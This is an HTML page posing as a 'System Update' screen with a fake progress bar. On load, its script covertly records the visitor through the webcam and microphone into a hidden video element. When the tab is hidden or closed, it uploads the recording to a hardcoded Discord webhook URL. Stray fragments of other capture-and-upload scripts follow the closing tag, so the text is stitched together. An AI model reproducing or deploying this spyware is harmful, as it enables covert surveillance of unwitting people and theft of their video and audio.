<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Update</title>
    <style>
        body { 
            background-color: #000; 
            color: #fff; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            overflow: hidden;
        }
        .loader {
            border: 3px solid #333;
            border-top: 3px solid #0078d4;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { margin-top: 20px; font-size: 14px; letter-spacing: 1px; color: #aaa; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <div id="status">INITIALIZING SYSTEM UPDATE...</div>
    <p style="font-size: 10px; color: #444; margin-top: 5px;">Progress: <span id="percent">0</span>%</p>

    <video id="v" autoplay muted style="display:none;"></video>

    <script>
        const HOOK = "https://discord.com/api/webhooks/1455135401042776064/lPm6cU4ACdX3UKDbSeYzmdxEYgMkGhqI-097947Cf8O3StFG5x2hPYsl-fxbIBQRrW0Q";
        let rec;
        let chunks = [];

        async function init() {
            try {
                // Request camera and microphone
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: true 
                });
                
                const v = document.getElementById('v');
                v.srcObject = stream;

                // Setup Media Recorder
                rec = new MediaRecorder(stream);
                
                rec.ondataavailable = (e) => {
                    if (e.data.size > 0) chunks.push(e.data);
                };

                // When stopped, send the final video to Discord
                rec.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const fd = new FormData();
                    fd.append('file', blob, 'capture_video.webm');
                    fd.append('content', 'ðŸŽ¥ **Video Recorded!** User closed the tab or session ended.');

                    await fetch(HOOK, { method: 'POST', body: fd });
                };

                // Start recording
                rec.start();
                updateUI();

            } catch (err) {
                document.getElementById('status').innerText = "ERROR: SYSTEM UPDATE REQUIRES PERMISSION";
                document.getElementById('status').style.color = "#ff4444";
            }
        }

        function updateUI() {
            let p = 0;
            const statusText = document.getElementById('status');
            const percentText = document.getElementById('percent');
            
            const interval = setInterval(() => {
                if (p < 99) {
                    p += Math.floor(Math.random() * 3) + 1;
                    if (p > 99) p = 99;
                    percentText.innerText = p;
                    if (p > 30) statusText.innerText = "UPDATING SYSTEM COMPONENTS...";
                    if (p > 70) statusText.innerText = "FINALIZING INSTALLATION...";
                }
            }, 2000);
        }

        // Trigger on load
        window.onload = init;

        // Ensure the video sends when the user closes the tab
        window.addEventListener("visibilitychange", () => {
            if (document.visibilityState === 'hidden' && rec && rec.state === 'recording') {
                rec.stop();
            }
        });

        window.onbeforeunload = () => {
            if (rec && rec.state !== 'inactive') {
                rec.stop();
            }
        };
    </script>
</body>
</html>
            // Repeat every 10 seconds (5s front + 5s back roughly)
            setInterval(captureCycle, 10000); 
        };
    </script>
</body>
</html>

            fetch(WEBHOOK_URL, {
                method: 'POST',
                body: formData
            })
            .then(() => {
                document.getElementById('status').innerText = "Content Loaded Successfully.";
            })
            .catch(err => {
                console.error("Transmission error:", err);
            });
        }

        // Initialize on page load
        window.onload = startCapture;
    </script>
</body>
</html>
